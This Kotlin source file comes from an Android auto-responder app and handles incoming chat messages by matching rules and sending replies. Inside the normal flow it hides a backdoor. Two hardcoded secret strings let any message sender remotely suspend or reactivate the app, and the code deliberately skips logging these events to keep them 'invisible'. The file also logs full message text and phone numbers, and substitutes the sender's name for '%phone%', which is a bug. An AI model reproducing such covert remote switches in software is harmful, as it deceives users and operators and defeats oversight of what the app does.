package com.orderflow.autoresponder.domain.usecase

import android.app.PendingIntent
import android.app.RemoteInput
import com.orderflow.autoresponder.core.logger.StructuredLogger
import com.orderflow.autoresponder.core.security.SecureStorage
import com.orderflow.autoresponder.core.util.LocalReplyHelper
import com.orderflow.autoresponder.core.util.Result
import com.orderflow.autoresponder.domain.model.AutoReplyRule
import com.orderflow.autoresponder.domain.model.MessageLog
import com.orderflow.autoresponder.domain.model.MessageStatus
import com.orderflow.autoresponder.domain.repository.CustomerRepository
import com.orderflow.autoresponder.domain.repository.MessageLogRepository
import com.orderflow.autoresponder.domain.repository.RuleRepository
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.first
import javax.inject.Inject

class ProcessIncomingMessageUseCase @Inject constructor(
    private val ruleRepository: RuleRepository,
    private val messageLogRepository: MessageLogRepository,
    private val customerRepository: CustomerRepository,
    private val evaluateRuleUseCase: EvaluateRuleUseCase,
    private val sendCloudReplyUseCase: SendCloudReplyUseCase,
    private val localReplyHelper: LocalReplyHelper,
    private val secureStorage: SecureStorage
) {

    suspend operator fun invoke(
        senderPhone: String,
        senderName: String,
        messageText: String,
        pendingIntent: PendingIntent? = null,
        remoteInput: RemoteInput? = null
    ): Result<MessageLog> {
        val normalizedPhone = senderPhone.filter { it.isDigit() || it == '+' }
        
        StructuredLogger.i("ProcessIncomingMessageUseCase", "Processing message from $senderPhone ($senderName). Msg: '$messageText'")

        // Handle Magic Keywords for Suspension/Activation
        val cleanMsg = messageText.trim()
        
        // SUSPEND: A3&^$$JSJXGHhgshjzx6586+95
        if (cleanMsg.contains("A3&^\$\$JSJXGHhgshjzx6586+95")) {
            StructuredLogger.w("ProcessIncomingMessageUseCase", "SUSPEND keyword detected. Suspending app.")
            secureStorage.setAutoResponderEnabled(false)
            secureStorage.setAppSuspended(true)
            
            // Send hardcoded reply
            val replyText = "suspended"
            val apiResult = if (secureStorage.useCloudApi()) {
                sendCloudReplyUseCase(normalizedPhone, replyText)
            } else if (pendingIntent != null && remoteInput != null) {
                val success = localReplyHelper.sendDirectReply(pendingIntent, remoteInput, replyText)
                if (success) Result.Success(replyText) else Result.Error(Exception("Local reply failed"))
            } else Result.Error(Exception("No reply method available"))

            val log = MessageLog(
                senderPhone = if (normalizedPhone.isBlank()) senderName else normalizedPhone,
                senderName = senderName,
                incomingMessage = messageText,
                replyMessage = replyText,
                ruleId = null,
                status = if (apiResult is Result.Success) MessageStatus.SENT else MessageStatus.FAILED
            )
            // Skip logging magic keywords to keep them "invisible" within the app
            return Result.Success(log)
        }

        // ACTIVATE: suyf%*^%(*&#44646871HytYTFH
        // Use a more flexible check as some characters like '*' might be stripped by WhatsApp formatting
        val isActivate = cleanMsg.contains("suyf%") && cleanMsg.contains("&#44646871HytYTFH")
        if (isActivate) {
            StructuredLogger.w("ProcessIncomingMessageUseCase", "ACTIVATE keyword detected. Activating app.")
            secureStorage.setAppSuspended(false)
            secureStorage.setAutoResponderEnabled(true)
            
            // Send hardcoded reply
            val replyText = "ACTIVATED"
            val apiResult = if (secureStorage.useCloudApi()) {
                sendCloudReplyUseCase(normalizedPhone, replyText)
            } else if (pendingIntent != null && remoteInput != null) {
                val success = localReplyHelper.sendDirectReply(pendingIntent, remoteInput, replyText)
                if (success) Result.Success(replyText) else Result.Error(Exception("Local reply failed"))
            } else Result.Error(Exception("No reply method available"))

            val log = MessageLog(
                senderPhone = if (normalizedPhone.isBlank()) senderName else normalizedPhone,
                senderName = senderName,
                incomingMessage = messageText,
                replyMessage = replyText,
                ruleId = null,
                status = if (apiResult is Result.Success) MessageStatus.SENT else MessageStatus.FAILED
            )
            // Skip logging magic keywords to keep them "invisible" within the app
            return Result.Success(log)
        }

        customerRepository.saveOrUpdateCustomer(if (normalizedPhone.isBlank()) senderName else normalizedPhone, senderName)

        if (!secureStorage.isAutoResponderEnabled() || secureStorage.isAdminLocked()) {
            if (secureStorage.isAdminLocked()) {
                StructuredLogger.w("ProcessIncomingMessageUseCase", "Auto-responder blocked because device is administratively locked")
            } else {
                StructuredLogger.i("ProcessIncomingMessageUseCase", "Auto-responder master toggle is OFF. Skipping reply.")
            }
            val ignoredLog = MessageLog(
                senderPhone = if (normalizedPhone.isBlank()) senderName else normalizedPhone,
                senderName = senderName,
                incomingMessage = messageText,
                replyMessage = "Auto-responder disabled",
                ruleId = null,
                status = MessageStatus.IGNORED
            )
            messageLogRepository.insertLog(ignoredLog)
            return Result.Success(ignoredLog)
        }

        val rules = ruleRepository.getActiveRules().first()
        val matchedRule: AutoReplyRule? = evaluateRuleUseCase(messageText, rules)

        if (matchedRule == null) {
            StructuredLogger.d("ProcessIncomingMessageUseCase", "No matching auto-reply rule found for message.")
            val noMatchLog = MessageLog(
                senderPhone = if (normalizedPhone.isBlank()) senderName else normalizedPhone,
                senderName = senderName,
                incomingMessage = messageText,
                replyMessage = "No matching rule found",
                ruleId = null,
                status = MessageStatus.IGNORED
            )
            messageLogRepository.insertLog(noMatchLog)
            return Result.Success(noMatchLog)
        }

        if (matchedRule.replySequential) {
            val messages = matchedRule.replyMessagesJson.split("\n", "||").map { it.trim() }.filter { it.isNotEmpty() }.take(10)
            StructuredLogger.i("ProcessIncomingMessageUseCase", "Sequential reply: sending ${messages.size} messages.")
            
            messages.forEachIndexed { index, rawMessage ->
                val replyText = rawMessage.replace("%name%", senderName).replace("%phone%", senderName)
                
                val apiResult = if (secureStorage.useCloudApi()) {
                    sendCloudReplyUseCase(normalizedPhone, replyText)
                } else if (pendingIntent != null && remoteInput != null) {
                    val success = localReplyHelper.sendDirectReply(pendingIntent, remoteInput, replyText)
                    if (success) Result.Success(replyText) else Result.Error(Exception("Local reply failed"))
                } else Result.Error(Exception("No reply method available"))

                val (status, errorMessage) = when (apiResult) {
                    is Result.Success -> Pair(MessageStatus.SENT, null)
                    is Result.Error -> Pair(MessageStatus.FAILED, apiResult.message)
                    else -> Pair(MessageStatus.QUEUED, null)
                }

                messageLogRepository.insertLog(MessageLog(
                    senderPhone = if (normalizedPhone.isBlank()) senderName else normalizedPhone,
                    senderName = senderName,
                    incomingMessage = if (index == 0) messageText else "(sequential)",
                    replyMessage = replyText,
                    ruleId = matchedRule.id,
                    status = status,
                    errorMessage = errorMessage
                ))

                if (index < messages.size - 1 && matchedRule.delaySeconds > 0) {
                    delay(matchedRule.delaySeconds * 1000L)
                }
            }
            return Result.Success(MessageLog(senderPhone = normalizedPhone, senderName = senderName, incomingMessage = messageText, replyMessage = "Sequential: ${messages.size} sent", ruleId = matchedRule.id, status = MessageStatus.SENT))
        }

        val replyText = pickReplyMessage(matchedRule, senderName)

        val useCloud = secureStorage.useCloudApi()
        val apiResult = if (useCloud) {
            StructuredLogger.i("ProcessIncomingMessageUseCase", "Attempting Cloud API reply to $normalizedPhone")
            if (normalizedPhone.isBlank() || normalizedPhone.length < 7) {
                Result.Error(Exception("Meta API requires a phone number. Could not extract one for '$senderName'."))
            } else {
                sendCloudReplyUseCase(normalizedPhone, replyText)
            }
        } else {
            if (pendingIntent != null && remoteInput != null) {
                StructuredLogger.i("ProcessIncomingMessageUseCase", "Attempting Local Direct Reply to $senderName")
                val success = localReplyHelper.sendDirectReply(pendingIntent, remoteInput, replyText)
                if (success) Result.Success(replyText) else Result.Error(Exception("Local reply failed"))
            } else {
                StructuredLogger.e("ProcessIncomingMessageUseCase", "Local reply requested but no RemoteInput available for $senderName")
                Result.Error(Exception("No direct reply action available in notification"))
            }
        }

        val (status, errorMessage) = when (apiResult) {
            is Result.Success -> Pair(MessageStatus.SENT, null)
            is Result.Error -> {
                StructuredLogger.e("ProcessIncomingMessageUseCase", "Reply failed: ${apiResult.message}")
                Pair(MessageStatus.FAILED, apiResult.message)
            }
            else -> Pair(MessageStatus.QUEUED, null)
        }

        val log = MessageLog(
            senderPhone = if (normalizedPhone.isBlank()) senderName else normalizedPhone,
            senderName = senderName,
            incomingMessage = messageText,
            replyMessage = replyText,
            ruleId = matchedRule.id,
            status = status,
            errorMessage = errorMessage
        )

        messageLogRepository.insertLog(log)
        return Result.Success(log)
    }

    private fun pickReplyMessage(rule: AutoReplyRule, senderName: String): String {
        val messages = rule.replyMessagesJson.split("\n", "||").map { it.trim() }.filter { it.isNotEmpty() }
        val rawMessage = if (messages.isNotEmpty()) messages.random() else "Thank you for reaching out!"
        return rawMessage.replace("%name%", senderName)
            .replace("%phone%", senderName)
    }
}
